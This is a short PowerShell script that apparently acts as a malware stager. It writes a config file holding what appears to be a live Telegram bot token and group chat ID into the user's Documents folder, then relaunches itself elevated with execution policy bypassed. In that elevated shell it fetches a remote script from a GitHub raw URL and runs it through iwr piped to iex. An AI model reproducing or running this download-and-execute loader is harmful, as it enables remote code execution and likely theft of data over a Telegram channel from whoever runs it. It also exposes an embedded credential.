
$scriptUrl = "https://raw.githubusercontent.com/uzigirl/std/main/menu/og.ps1" 
$documentsPath = [Environment]::GetFolderPath("MyDocuments")
$configFilePath = Join-Path -Path $documentsPath -ChildPath "config.txt"
$configContent = @"
BOT_TOKEN=7922611040:AAEU1YqPYGjfN0SwaHvxD5ADZVFjGdGu29o
GROUP_CHAT_ID=-4620571711
"@
Try {
    $configContent | Set-Content -Path $configFilePath -Force
    Write-Host "Configuration file created successfully at: $configFilePath"
} Catch {
    Write-Error "Failed to create the configuration file: $_"
}

If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Restart the script with admin rights for tasks that require elevation
    Start-Process powershell.exe -ArgumentList "-NoExit -ExecutionPolicy Bypass -Command `"& { iwr -Uri '$scriptUrl' -UseBasicParsing | iex }`"" -Verb RunAs
    Exit
}

Write-Host "Running as Administrator... Perform admin-required tasks here."
